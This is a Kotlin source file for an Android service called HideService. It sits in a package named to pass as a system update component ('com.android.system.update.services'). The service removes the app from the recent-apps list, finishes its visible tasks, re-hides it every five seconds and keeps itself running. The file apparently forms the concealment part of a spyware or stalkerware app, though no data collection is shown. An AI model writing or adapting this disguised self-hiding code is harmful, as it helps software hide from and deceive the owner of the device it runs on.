package com.android.system.update.services

import android.app.ActivityManager
import android.app.Service
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log

class HideService : Service() {
    
    companion object {
        private const val TAG = "HideService"
        private const val CHECK_INTERVAL = 5000L // 5 seconds
    }
    
    private var isRunning = false
    private var hidden = false
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (isRunning) return START_STICKY
        isRunning = true
        
        // Hide from recent apps
        hideFromRecentApps()
        
        // Start monitoring
        startMonitoring()
        
        return START_STICKY
    }
    
    private fun hideFromRecentApps() {
        try {
            // Remove from recent apps list by making it invisible
            val activityManager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val appTasks = activityManager.appTasks
            for (task in appTasks) {
                task.setExcludeFromRecents(true)
                task.finishAndRemoveTask()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error hiding from recent apps: ${e.message}")
        }
    }
    
    private fun startMonitoring() {
        Handler(Looper.getMainLooper()).postDelayed(object : Runnable {
            override fun run() {
                if (!isRunning) return
                
                // Keep removing from recent apps
                try {
                    val activityManager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
                    val appTasks = activityManager.appTasks
                    for (task in appTasks) {
                        if (task.taskInfo?.baseActivity?.packageName == packageName) {
                            task.setExcludeFromRecents(true)
                        }
                    }
                } catch (e: Exception) {
                    // Ignore
                }
                
                Handler(Looper.getMainLooper()).postDelayed(this, CHECK_INTERVAL)
            }
        }, CHECK_INTERVAL)
    }
    
    override fun onDestroy() {
        isRunning = false
        super.onDestroy()
    }
}